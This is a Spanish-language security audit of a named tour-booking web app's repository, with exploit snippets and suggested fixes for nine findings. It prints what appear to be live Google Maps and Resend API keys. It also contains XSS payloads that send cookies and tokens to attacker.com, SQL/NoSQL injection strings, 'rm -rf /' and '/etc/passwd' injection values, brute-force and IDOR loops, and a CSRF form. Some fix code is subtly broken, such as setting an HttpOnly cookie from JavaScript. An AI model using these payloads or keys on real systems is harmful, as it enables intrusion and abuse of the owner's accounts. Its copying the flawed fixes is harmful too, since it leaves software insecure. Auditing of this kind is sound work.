# Reporte de Vulnerabilidades de Seguridad - César Tours Web

## Resumen Ejecutivo

Este documento detalla las vulnerabilidades de seguridad identificadas en la aplicación web de César Tours, clasificadas por severidad. Se incluyen vectores de ataque, explotación y medidas de mitigación para cada vulnerabilidad.

---

## 1. EXPOSICIÓN DE API KEYS HARDCODEADAS

### 🔴 **SEVERIDAD: CRÍTICA**

**Archivos Afectados:**
- `.env:1-4`
- `src/config/config.ts:1`
- `src/utils/api/request.ts:6`

**Descripción:**
Las API keys de Google Maps y Resend están hardcodeadas y expuestas en el repositorio público.

```typescript
// Código vulnerable
export const {VITE_CESAR_API,VITE_BASE_URL, VITE_GOOGLE_API_KEY,VITE_RESEND_API_KEY} = import.meta.env
```

### 🎯 **Cómo Explotarlo:**

```bash
# 1. Clonar el repositorio público
git clone https://github.com/Albert2707/cesar-tours-web.git

# 2. Extraer las API keys del archivo .env
cat .env
# VITE_GOOGLE_API_KEY = "AIzaSyBmfsX6t42UI2VyhdXCtZQLiMLKi0ACDwE"
# VITE_RESEND_API_KEY = "re_adHBoSud_MiXFWWwj8uwpqrcjBvYE15KJ"

# 3. Usar las keys para:
# - Generar costos en Google Maps API
# - Enviar emails masivos con Resend
# - Agotar límites de quota
```

### 🛠️ **Cómo Solucionarlo:**

```bash
# 1. Remover .env del repositorio
git rm --cached .env
echo ".env" >> .gitignore

# 2. Regenerar todas las API keys comprometidas
# - Google Cloud Console > APIs & Services > Credentials
# - Resend Dashboard > API Keys

# 3. Configurar variables de entorno en producción
# Ejemplo para .env.example:
VITE_GOOGLE_API_KEY=your_google_api_key_here
VITE_RESEND_API_KEY=your_resend_api_key_here
```

```typescript
// 4. Implementar validación de environment
const config = {
  googleApiKey: import.meta.env.VITE_GOOGLE_API_KEY,
  resendApiKey: import.meta.env.VITE_RESEND_API_KEY,
  baseUrl: import.meta.env.VITE_BASE_URL,
};

// Validar que las keys existan
Object.entries(config).forEach(([key, value]) => {
  if (!value) {
    throw new Error(`Missing environment variable: ${key}`);
  }
});
```

---

## 2. AUTENTICACIÓN DÉBIL Y SESSION MANAGEMENT INSEGURO

### 🔴 **SEVERIDAD: CRÍTICA**

**Archivos Afectados:**
- `src/context/authContext.tsx:14-51`
- `src/shared/hooks/privateRoutes/PrivateRoutes.tsx:10-14`

**Descripción:**
Sistema de autenticación con múltiples vulnerabilidades críticas.

### 🎯 **Cómo Explotarlo:**

```javascript
// 1. XSS para robar tokens
<script>
  // Robar token del sessionStorage
  const token = sessionStorage.getItem('token');
  fetch('https://attacker.com/steal?token=' + token);
</script>

// 2. Session Fixation
// Forzar un token específico antes del login
sessionStorage.setItem('token', 'malicious_token');

// 3. Brute Force (sin rate limiting)
async function bruteForce() {
  const passwords = ['123456', 'password', 'admin'];
  for (let pass of passwords) {
    try {
      await fetch('/api/user/login', {
        method: 'POST',
        body: JSON.stringify({email: 'admin@company.com', password: pass})
      });
    } catch(e) { /* continuar */ }
  }
}
```

### 🛠️ **Cómo Solucionarlo:**

```typescript
// 1. Implementar almacenamiento seguro de tokens
class SecureTokenStorage {
  private static readonly TOKEN_KEY = 'auth_token';
  
  static setToken(token: string, expiresIn: number) {
    const expirationTime = Date.now() + (expiresIn * 1000);
    const tokenData = { token, expirationTime };
    
    // Usar httpOnly cookies en lugar de sessionStorage
    document.cookie = `${this.TOKEN_KEY}=${JSON.stringify(tokenData)}; Secure; HttpOnly; SameSite=Strict; Max-Age=${expiresIn}`;
  }
  
  static getToken(): string | null {
    // Implementar lógica de validación de expiración
    const tokenData = this.getTokenData();
    if (tokenData && tokenData.expirationTime > Date.now()) {
      return tokenData.token;
    }
    this.removeToken();
    return null;
  }
}

// 2. Implementar rate limiting en el frontend
class RateLimiter {
  private attempts: Map<string, number[]> = new Map();
  
  canAttempt(identifier: string, maxAttempts: number = 5, windowMs: number = 300000): boolean {
    const now = Date.now();
    const attempts = this.attempts.get(identifier) || [];
    
    // Limpiar intentos antiguos
    const validAttempts = attempts.filter(time => now - time < windowMs);
    
    if (validAttempts.length >= maxAttempts) {
      return false;
    }
    
    validAttempts.push(now);
    this.attempts.set(identifier, validAttempts);
    return true;
  }
}

// 3. Mejorar el contexto de autenticación
const AuthContextProvider: FC<ContextProps> = ({ children }) => {
  const [token, setToken] = useState(SecureTokenStorage.getToken());
  const [currentUser, setCurrentUser] = useState({});
  const [isLoggedIn, setIsLoggedIn] = useState<boolean>(false);
  const rateLimiter = new RateLimiter();

  const login = useCallback(async (email: string, password: string) => {
    // Validar rate limiting
    if (!rateLimiter.canAttempt(email)) {
      throw new Error('Demasiados intentos de login. Intente más tarde.');
    }
    
    // Validar entrada
    if (!email || !password) {
      throw new Error('Email y contraseña son requeridos');
    }
    
    try {
      const response = await request.post("user/login", { email, password });
      
      // Validar respuesta del servidor
      if (!response.data.token || !response.data.expiresIn) {
        throw new Error('Respuesta de autenticación inválida');
      }
      
      SecureTokenStorage.setToken(response.data.token, response.data.expiresIn);
      setToken(response.data.token);
      return response.data;
    } catch (error) {
      console.error("Error logging in:", error);
      throw error;
    }
  }, []);
};
```

---

## 3. FALTA DE VALIDACIÓN DE ENTRADA Y SANITIZACIÓN

### 🟡 **SEVERIDAD: MODERADA**

**Archivos Afectados:**
- `src/pages/public/checkout/Checkout.tsx:246-250`
- `src/features/booking/Booking.tsx:87-113`

**Descripción:**
Validación insuficiente de datos de entrada permite inyección de código y manipulación de datos.

### 🎯 **Cómo Explotarlo:**

```javascript
// 1. Inyección en campos de texto
const maliciousInput = {
  name: "<script>alert('XSS')</script>",
  email: "test@evil.com'; DROP TABLE users; --",
  additionalNotes: "<img src=x onerror=fetch('https://attacker.com/steal?data='+document.cookie)>",
  phone: "javascript:alert('XSS')"
};

// 2. Manipulación de parámetros
const manipulatedOrder = {
  total: -1000, // Precio negativo
  passengers: 999, // Exceder límites
  vehicleId: "' OR '1'='1", // SQL injection attempt
};

// 3. Location spoofing
const fakeLocation = {
  lat: "'; DROP TABLE locations; --",
  lng: "<script>maliciousCode()</script>",
  formatted_address: "<iframe src='https://evil.com'></iframe>"
};
```

### 🛠️ **Cómo Solucionarlo:**

```typescript
// 1. Implementar validación robusta
import { z } from 'zod';
import DOMPurify from 'dompurify';

const orderSchema = z.object({
  name: z.string().min(1).max(100).regex(/^[a-zA-ZÀ-ÿ\s]+$/),
  email: z.string().email(),
  phone: z.string().regex(/^\+?[\d\s\-\(\)]+$/),
  total: z.number().positive().max(10000),
  passengers: z.number().int().min(1).max(30),
  additionalNotes: z.string().max(500)
});

// 2. Sanitización de entrada
class InputSanitizer {
  static sanitizeString(input: string): string {
    return DOMPurify.sanitize(input, { 
      ALLOWED_TAGS: [],
      ALLOWED_ATTR: []
    });
  }
  
  static sanitizeLocation(location: any) {
    return {
      lat: Number(location.lat) || 0,
      lng: Number(location.lng) || 0,
      formatted_address: this.sanitizeString(location.formatted_address || '')
    };
  }
}

// 3. Validación en el componente
const handleInput = (
  event: React.FormEvent<HTMLInputElement>,
  key: keyof Inputs
) => {
  const value = event.currentTarget.value;
  
  // Sanitizar entrada
  const sanitizedValue = InputSanitizer.sanitizeString(value);
  
  // Validar según el tipo de campo
  if (key === 'phone') {
    const numericValue = sanitizedValue.replace(/\D/g, "");
    event.currentTarget.value = numericValue;
    setValue(key, numericValue, { shouldValidate: true });
  } else {
    setValue(key, sanitizedValue, { shouldValidate: true });
  }
};
```

---

## 4. INSECURE DIRECT OBJECT REFERENCES (IDOR)

### 🟡 **SEVERIDAD: MODERADA**

**Archivos Afectados:**
- `src/pages/public/checkout/services/checkoutService.ts:12`
- `src/features/orders/services/orderServices.ts`

**Descripción:**
Sin validación de autorización en acceso a recursos, permitiendo acceso no autorizado a datos.

### 🎯 **Cómo Explotarlo:**

```javascript
// 1. Enumeración de órdenes
for (let i = 1; i <= 1000; i++) {
  fetch(`/api/order/${i}`, {
    headers: { 'Authorization': 'Bearer stolen_token' }
  })
  .then(res => res.json())
  .then(data => console.log(`Order ${i}:`, data));
}

// 2. Modificación de órdenes ajenas
fetch('/api/order/123', {
  method: 'PUT',
  headers: { 'Authorization': 'Bearer valid_token' },
  body: JSON.stringify({
    total: 1, // Cambiar precio de orden ajena
    status: 'cancelled'
  })
});

// 3. Acceso a datos de otros usuarios
fetch('/api/user/profile/456', {
  headers: { 'Authorization': 'Bearer any_valid_token' }
});
```

### 🛠️ **Cómo Solucionarlo:**

```typescript
// 1. Implementar middleware de autorización
interface AuthenticatedRequest {
  user: { id: string; role: string };
  params: { id: string };
}

class AuthorizationMiddleware {
  static validateOrderAccess(req: AuthenticatedRequest): boolean {
    const { user, params } = req;
    
    // Solo el propietario o admin puede acceder
    if (user.role === 'admin') return true;
    
    // Verificar que el usuario sea propietario de la orden
    const order = OrderService.findById(params.id);
    return order?.customerId === user.id;
  }
  
  static validateUserAccess(req: AuthenticatedRequest): boolean {
    const { user, params } = req;
    
    // Solo puede acceder a su propio perfil o ser admin
    return user.id === params.id || user.role === 'admin';
  }
}

// 2. Implementar en el servicio
export class SecureCheckoutService {
  static async createOrder(order: OrderData, userId: string): Promise<CheckoutResponse> {
    // Asociar orden al usuario autenticado
    const secureOrder = {
      ...order,
      customerId: userId, // Forzar el ID del usuario autenticado
      createdAt: new Date(),
      status: 'pending'
    };
    
    try {
      const res = await request.post("order/createOrder", secureOrder);
      return res.data as CheckoutResponse;
    } catch (error) {
      return Promise.reject(handlePromiseError(error));
    }
  }
  
  static async getOrder(orderId: string, userId: string) {
    // Validar que el usuario puede acceder a esta orden
    const order = await request.get(`order/${orderId}`);
    
    if (order.customerId !== userId) {
      throw new Error('Acceso no autorizado');
    }
    
    return order;
  }
}
```

---

## 5. CROSS-SITE SCRIPTING (XSS)

### 🟡 **SEVERIDAD: MODERADA**

**Archivos Afectados:**
- `src/features/booking/Booking.tsx:344`
- Múltiples componentes sin sanitización

**Descripción:**
Uso de `alert()` y falta de sanitización permite ejecución de scripts maliciosos.

### 🎯 **Cómo Explotarlo:**

```javascript
// 1. XSS Reflected través de parámetros URL
// URL: /booking?name=<script>alert('XSS')</script>

// 2. XSS Stored en comentarios
const maliciousComment = `
<img src=x onerror="
  // Robar cookies
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage)
    })
  });
">
`;

// 3. DOM-based XSS
location.hash = '#<script>maliciousCode()</script>';

// 4. Explotación del alert() existente
// Inyectar código en el contexto donde se ejecuta alert()
```

### 🛠️ **Cómo Solucionarlo:**

```typescript
// 1. Reemplazar alert() con toast notifications
import { toast } from 'react-hot-toast';

// En lugar de:
onClick={() => alert("marker was clicked!")}

// Usar:
onClick={() => toast.success("Marcador seleccionado")}

// 2. Implementar Content Security Policy
// En index.html:
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline' https://maps.googleapis.com; 
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
               img-src 'self' data: https:;
               connect-src 'self' https://api.resend.com;">

// 3. Sanitización de datos
import DOMPurify from 'dompurify';

const SafeDisplay: React.FC<{ content: string }> = ({ content }) => {
  const sanitizedContent = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />;
};

// 4. Validación estricta de entrada
const sanitizeUserInput = (input: string): string => {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: [],
    ALLOWED_ATTR: []
  });
};
```

---

## 6. INJECTION ATTACKS

### 🟡 **SEVERIDAD: MODERADA**

**Descripción:**
Falta de validación del lado servidor permite inyección en bases de datos y servicios externos.

### 🎯 **Cómo Explotarlo:**

```javascript
// 1. SQL Injection (si backend usa SQL)
const maliciousOrder = {
  name: "'; DROP TABLE orders; --",
  email: "admin@company.com' UNION SELECT password FROM users WHERE email='admin@company.com",
  additionalNotes: "1' OR '1'='1"
};

// 2. NoSQL Injection (si backend usa MongoDB)
const nosqlInjection = {
  email: { "$ne": null },
  password: { "$regex": ".*" }
};

// 3. Command Injection
const commandInjection = {
  filename: "file.txt; rm -rf /",
  path: "../../../etc/passwd"
};
```

### 🛠️ **Cómo Solucionarlo:**

```typescript
// 1. Validación de esquemas
import Joi from 'joi';

const orderValidationSchema = Joi.object({
  name: Joi.string().alphanum().min(1).max(100).required(),
  email: Joi.string().email().required(),
  phone: Joi.string().pattern(/^\+?[\d\s\-\(\)]+$/).required(),
  additionalNotes: Joi.string().max(500).optional(),
  total: Joi.number().positive().max(10000).required()
});

// 2. Sanitización en backend (ejemplo Node.js)
import validator from 'validator';
import { escape } from 'html-entities';

class DataSanitizer {
  static sanitizeOrder(order: any) {
    return {
      name: escape(validator.escape(order.name)),
      email: validator.normalizeEmail(order.email),
      phone: validator.escape(order.phone.replace(/[^\d\+\-\(\)\s]/g, '')),
      additionalNotes: escape(validator.escape(order.additionalNotes || '')),
      total: parseFloat(order.total) || 0
    };
  }
}

// 3. Prepared statements (ejemplo)
const createOrderQuery = `
  INSERT INTO orders (name, email, phone, total, customer_id) 
  VALUES (?, ?, ?, ?, ?)
`;
```

---

## 7. INSECURE COMMUNICATION

### 🟡 **SEVERIDAD: MODERADA**

**Archivos Afectados:**
- `src/utils/api/request.ts:3-9`

**Descripción:**
Configuración de comunicación HTTP insegura y headers expuestos.

### 🎯 **Cómo Explotarlo:**

```javascript
// 1. Man-in-the-Middle (si usa HTTP)
// Interceptar requests y modificar datos

// 2. Header injection
fetch('/api/endpoint', {
  headers: {
    'resendApiKey': 'injected_value\r\nX-Injected-Header: malicious'
  }
});

// 3. CSRF sin protección
// Crear formulario malicioso que envíe requests autenticados
const maliciousForm = `
<form action="https://cesar-tours.com/api/order/create" method="POST">
  <input name="total" value="0">
  <input name="passengers" value="100">
</form>
<script>document.forms[0].submit();</script>
`;
```

### 🛠️ **Cómo Solucionarlo:**

```typescript
// 1. Configuración segura de axios
import axios from 'axios';

export const secureRequest = axios.create({
  baseURL: import.meta.env.VITE_BASE_URL,
  timeout: 10000,
  withCredentials: true,
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest' // CSRF protection
  }
});

// 2. Interceptor para manejo seguro de tokens
secureRequest.interceptors.request.use(
  (config) => {
    const token = SecureTokenStorage.getToken();
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    
    // Agregar CSRF token
    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
    if (csrfToken) {
      config.headers['X-CSRF-Token'] = csrfToken;
    }
    
    return config;
  },
  (error) => Promise.reject(error)
);

// 3. Manejo de errores seguro
secureRequest.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      // Token expirado, limpiar sesión
      SecureTokenStorage.removeToken();
      window.location.href = '/login';
    }
    
    // No exponer detalles del error en producción
    const sanitizedError = {
      message: 'Error en la solicitud',
      status: error.response?.status || 500
    };
    
    return Promise.reject(sanitizedError);
  }
);
```

---

## 8. CLIENT-SIDE SECURITY ISSUES

### 🟡 **SEVERIDAD: MODERADA**

**Descripción:**
Múltiples problemas de seguridad del lado cliente.

### 🎯 **Cómo Explotarlo:**

```javascript
// 1. Local Storage tampering
localStorage.setItem('user', JSON.stringify({
  id: 'admin',
  role: 'administrator',
  permissions: ['all']
}));

// 2. Route manipulation
// Acceder directamente a rutas protegidas modificando el estado
history.pushState({}, '', '/admin/dashboard');

// 3. State manipulation
// Modificar el store de Zustand directamente
window.__ZUSTAND__ = {
  isLoggedIn: true,
  currentUser: { role: 'admin' }
};
```

### 🛠️ **Cómo Solucionarlo:**

```typescript
// 1. Implementar Content Security Policy
const cspConfig = {
  "default-src": ["'self'"],
  "script-src": ["'self'", "'unsafe-inline'", "https://maps.googleapis.com"],
  "style-src": ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
  "img-src": ["'self'", "data:", "https:"],
  "connect-src": ["'self'", "https://api.resend.com"],
  "frame-ancestors": ["'none'"],
  "base-uri": ["'self'"],
  "form-action": ["'self'"]
};

// 2. Validación del lado servidor para todas las rutas protegidas
const ProtectedRoute: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [isValidated, setIsValidated] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  
  useEffect(() => {
    const validateSession = async () => {
      try {
        // Validar token en el servidor
        const response = await secureRequest.get('/api/auth/validate');
        setIsValidated(response.data.valid);
      } catch {
        setIsValidated(false);
      } finally {
        setIsLoading(false);
      }
    };
    
    validateSession();
  }, []);
  
  if (isLoading) return <Loader />;
  if (!isValidated) return <Navigate to="/login" />;
  
  return <>{children}</>;
};

// 3. Implementar headers de seguridad
// En vite.config.ts
export default defineConfig({
  plugins: [
    react(),
    tsconfigPaths(),
    {
      name: 'security-headers',
      configureServer(server) {
        server.middlewares.use((req, res, next) => {
          res.setHeader('X-Frame-Options', 'DENY');
          res.setHeader('X-Content-Type-Options', 'nosniff');
          res.setHeader('X-XSS-Protection', '1; mode=block');
          res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
          next();
        });
      }
    }
  ]
});
```

---

## 9. DEPENDENCY VULNERABILITIES

### 🟡 **SEVERIDAD: MODERADA**

**Descripción:**
Dependencias desactualizadas con vulnerabilidades conocidas.

### 🎯 **Cómo Explotarlo:**

```bash
# 1. Análisis de dependencias vulnerables
npm audit
pnpm audit

# 2. Explotación de vulnerabilidades conocidas
# - Prototype pollution en versiones antiguas
# - XSS en componentes desactualizados
# - RCE en herramientas de build
```

### 🛠️ **Cómo Solucionarlo:**

```bash
# 1. Auditoría y actualización de dependencias
pnpm audit --audit-level moderate
pnpm update

# 2. Implementar verificación automática
# En package.json:
{
  "scripts": {
    "security-check": "pnpm audit && pnpm outdated",
    "update-deps": "pnpm update --interactive --latest"
  }
}

# 3. Configurar renovate o dependabot
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

---

## 🚨 PLAN DE ACCIÓN PRIORITARIO

### **Inmediato (24 horas):**
1. ✅ Regenerar y asegurar todas las API keys
2. ✅ Remover `.env` del repositorio y configurar `.gitignore`
3. ✅ Implementar almacenamiento seguro de tokens
4. ✅ Eliminar statements `alert()` de producción

### **Corto Plazo (1 semana):**
1. ✅ Implementar validación y sanitización robusta
2. ✅ Agregar CSP y headers de seguridad
3. ✅ Configurar rate limiting
4. ✅ Implementar autorización en rutas protegidas

### **Mediano Plazo (1 mes):**
1. ✅ Auditar y actualizar dependencias
2. ✅ Implementar logging de seguridad
3. ✅ Configurar monitoreo de vulnerabilidades
4. ✅ Realizar testing de penetración

---

## 📋 CHECKLIST DE VERIFICACIÓN

- [ ] API keys removidas del código fuente
- [ ] Tokens almacenados de forma segura (httpOnly cookies)
- [ ] Validación implementada en cliente y servidor
- [ ] CSP configurado y activo
- [ ] Rate limiting implementado
- [ ] Autorización validada en todas las rutas
- [ ] Dependencias actualizadas y auditadas
- [ ] Headers de seguridad configurados
- [ ] Logging de seguridad implementado
- [ ] Tests de seguridad ejecutados

---

**Nota:** Este reporte está destinado únicamente para propósitos defensivos y mejora de la seguridad. Cualquier uso malicioso de esta información está estrictamente prohibido.